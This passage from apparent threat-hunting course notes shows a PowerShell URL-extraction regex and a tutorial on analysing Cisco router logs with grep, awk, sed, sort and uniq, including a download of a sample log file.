$regex = '([a-zA-Z]{3,})://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
select-string -Path $input_path -Pattern $regex -AllMatches | % { $_.Matches } | % { $_.Value } > $output_file
---------------------------------------------------------------
 
In addition to the examples above, many other types of strings can be extracted using this script.
All you need to do is switch the regular expression in the "$regex" variable!
In fact, the beauty of such a PowerShell script is its simplicity and speed of execution.



                            ######################################
----------- ############### # Day 5: Wrapping up threat hunting  ################ -----------
                            #####################################

##############################################
# Log Analysis with Linux command-line tools #
##############################################
The following command line executables are found in the Mac as well as most Linux Distributions.
 
cat –  prints the content of a file in the terminal window
grep – searches and filters based on patterns
awk –  can sort each row into fields and display only what is needed
sed –  performs find and replace functions
sort – arranges output in an order
uniq – compares adjacent lines and can report, filter or provide a count of duplicates
 
 
##############
# Cisco Logs #
##############
 
-----------------------------Type this-----------------------------------------
wget http://45.63.104.73/cisco.log
-------------------------------------------------------------------------------
 
AWK Basics
----------
To quickly demonstrate the print feature in awk, we can instruct it to show only the 5th word of each line. Here we will print $5. Only the last 4 lines are being shown for brevity.
 
-----------------------------Type this-----------------------------------------
cat cisco.log | awk '{print $5}' | tail -n 4
-------------------------------------------------------------------------------
 
 
 
Looking at a large file would still produce a large amount of output. A more useful thing to do might be to output every entry found in “$5”, group them together, count them, then sort them from the greatest to least number of occurrences. This can be done by piping the output through “sort“, using “uniq -c” to count the like entries, then using “sort -rn” to sort it in reverse order.
 
-----------------------------Type this-----------------------------------------
cat cisco.log | awk '{print $5}'| sort | uniq -c | sort -rn
-------------------------------------------------------------------------------
 
 
 
While that’s sort of cool, it is obvious that we have some garbage in our output. Evidently we have a few lines that aren’t conforming to the output we expect to see in $5. We can insert grep to filter the file prior to feeding it to awk. This insures that we are at least looking at lines of text that contain “facility-level-mnemonic”.
 
-----------------------------Type this-----------------------------------------
cat cisco.log | grep %[a-zA-Z]*-[0-9]-[a-zA-Z]* | awk '{print $5}' | sort | uniq -c | sort -rn
-------------------------------------------------------------------------------
 
 
 
 
Now that the output is cleaned up a bit, it is a good time to investigate some of the entries that appear most often. One way to see all occurrences is to use grep.
 
-----------------------------Type this-----------------------------------------
cat cisco.log | grep %LINEPROTO-5-UPDOWN:
 
cat cisco.log | grep %LINEPROTO-5-UPDOWN:| awk '{print $10}' | sort | uniq -c | sort -rn
 
cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10}' | sort | uniq -c | sort -rn
 
cat cisco.log | grep %LINEPROTO-5-UPDOWN:| sed 's/,//g' | awk '{print $10 " changed to " $14}' | sort | uniq -c | sort -rn
--------------------------------------------------------------------------------